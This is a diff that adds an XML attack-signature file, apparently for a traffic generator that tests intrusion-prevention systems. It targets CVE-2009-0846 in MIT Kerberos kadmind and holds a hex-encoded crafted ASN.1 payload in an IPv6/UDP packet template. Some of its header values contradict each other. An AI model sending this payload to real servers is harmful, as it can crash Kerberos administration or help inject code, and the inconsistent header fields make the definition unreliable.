@@ -1,0 +1,93 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="MIT Kerberos ASN.1 asn1_decode_generaltime Uninitialized Pointer Reference (IPv6 Version)"/>
+    <EngDesc display="true" value="A memory corruption vulnerability exists in MIT Kerberos server. The vulnerability is due to the release of an uninitialized pointer in the ASN.1 decoder while decoding maliciously crafted data. A remote, unauthenticated attackercan exploit this vulnerability by sending a specially crafted RPC request to the kadmind daemon.            In an attack aiming for denial of service, the Kerberos kadmind service will terminate abnormally as a resultof an attack. The Kerberos administration functionality remains unavailable until the service is restarted.            In a more sophisticated attack scenario, where the malicious user is successful in injecting and executingsupplied code, the behaviour of the system is dependent on the nature the injected code. Any code injectedinto the vulnerable component would execute in the security context of the service process, which may besystem/root level. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="MEMORY_CORRUPTION"/>
+    </Intent>
+    <Protocol display="true" value="KRB5/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="MIT"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="MIT_MIT_Kerberos"/>
+      <item value="MIT_MIT_Ubuntu_Linux"/>
+      <item value="MIT_MIT_Linux"/>
+      <item value="MIT_MIT_SUSE_LINUX"/>
+      <item value="MIT_MIT_RHEL_Desktop_Workstation"/>
+      <item value="MIT_MIT_Enterprise_Linux"/>
+      <item value="MIT_MIT_Enterprise_Linux_Desktop"/>
+      <item value="MIT_MIT_Solaris"/>
+      <item value="MIT_MIT_Sun_Enterprise_Authentication_Mechanism"/>
+      <item value="MIT_MIT_OpenSolaris"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="MIT_Kerberos_prior_to_krb5-1.6.4"/>
+      <item value="MIT_Ubuntu_Linux_"/>
+      <item value="MIT_Linux_"/>
+      <item value="MIT_SUSE_LINUX_"/>
+      <item value="MIT_RHEL_Desktop_Workstation_5_client"/>
+      <item value="MIT_Enterprise_Linux_5_server"/>
+      <item value="MIT_Enterprise_Linux_Desktop_5_client"/>
+      <item value="MIT_Solaris_10"/>
+      <item value="MIT_Solaris_9"/>
+      <item value="MIT_Sun_Enterprise_Authentication_Mechanism_1.0.1"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20090407-04"/>
+    <CVEID display="true" value="CVE-2009-0846"/>
+    <bugtraqID display="true" value="34409"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="630ba3ba7289559fd758cf7d9fde5964"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="Complete"/>
+    <IntegImpact display="false" value="Complete"/>
+    <AvailImpact display="false" value="Complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="1243514002"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1242916794" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="E"/>
+    <NamedVar name="KRB5destPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <UDP srcPort="@random(1026,65535)" destPort="$KRB5destPort" checksum="5A7E" length="00B6" Payload="6A81AB3081A8A103020105A20302010AA4819B308160A00703050040000010A111300FA003020101A10830061B04726F6F74A20F1B0D5652542E54454C55532E434F4DA3223020A003020100A11930171B066B72627467741B0D5652542E54454C55532E434F4DA411180F32303039303430383137353533365AA511180F32303039303331313231353731375AA706020548DCE518A8173015020112020111020110020117020101020103020102"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+</threatSignature>
